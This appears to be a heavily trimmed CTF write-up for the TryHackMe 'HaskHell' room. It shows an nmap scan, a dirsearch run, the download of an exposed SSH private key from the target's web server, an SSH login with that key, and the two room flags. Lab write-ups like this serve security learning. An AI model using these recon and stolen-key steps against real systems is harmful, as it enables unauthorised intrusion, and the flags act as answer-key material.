...
```
bibo318@parrot:~/CTFs/tryhackme/HaskHell$ sudo nmap -A -sS -sC -sV -O 10.10.34.202
...
```
bibo318@parrot:~/CTFs/tryhackme/HaskHell$ sudo /opt/dirsearch/dirsearch.py -u http://10.10.34.202:5001 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e html,php
...
```
bibo318@parrot:~/CTFs/tryhackme/HaskHell$ wget http://10.10.34.202:8000/id_rsa
...
bibo318@parrot:~/CTFs/tryhackme/HaskHell$ chmod 600 id_rsa
bibo318@parrot:~/CTFs/tryhackme/HaskHell$ ssh -i id_rsa prof@10.10.34.202
...
`flag{academic_dishonesty12**123:))}`

2. Obtain the flag in root.txt

`flag{im_purely_functional12**123:))}`
